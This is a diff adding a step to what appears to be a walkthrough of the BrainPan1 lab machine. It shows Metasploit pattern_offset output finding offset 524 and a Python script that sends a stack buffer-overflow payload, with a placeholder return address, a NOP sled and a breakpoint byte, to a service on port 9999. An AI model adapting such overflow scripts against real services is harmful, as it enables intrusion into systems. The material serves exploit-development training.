@@ -121,3 +121,30 @@ s.close()
 <img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain4.jpg" width="60%"></img>
 
 
+```
+root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134
+[*] Exact match at offset 524
+```
+
+
+```
+import sys, socket
+import struct
+
+buf = "A" * 524
+ret = "BBBB"
+nops = "\x90" * 32
+shell = "\xCC"
+
+payload = buf + ret + nops + shell
+
+target = ('127.0.0.1', 9999)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+s.recv(1024)
+s.send(payload)
+s.recv(1024)
+s.close()
+```
+
+
